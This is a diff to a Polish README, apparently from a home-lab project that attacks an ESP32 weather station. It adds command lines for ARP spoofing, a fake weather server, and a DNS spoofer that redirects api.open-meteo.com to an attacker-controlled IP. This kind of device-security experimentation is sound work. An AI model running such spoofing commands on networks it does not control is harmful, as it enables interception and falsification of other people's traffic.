@@ -36,3 +36,11 @@ Próba wpłynięcia na to, co wyświetla stacja.
 1. **`esp_finder.py`**: Skrypt do znalezienia IP urządzenia ESP32 w sieci.
 2. **`weather_interceptor.py`**: Skrypt realizujący ARP Spoofing i logujący zapytania HTTP z ESP32.
 3. **`weather_spoofer.py`**: Rozszerzona wersja interceptora, która podmienia dane w odpowiedziach JSON.
+
+sudo python3 src/cam_sec/weather_interceptor.py --target 192.168.0.XXX --gateway 192.168.0.XXX -i wlp2s0
+
+sudo python3 src/cam_sec/esp_finder.py -t 192.168.0.XXX/24^C
+
+sudo python3 src/cam_sec/fake_weather_server.py
+
+sudo python3 src/cam_sec/dns_spoofer.py --target 192.168.0.XXX --gateway 192.168.0.XXX -i wlp2s0 --spoof-domain "api.open-meteo.com" --fake-ip 192.168.0.XXX
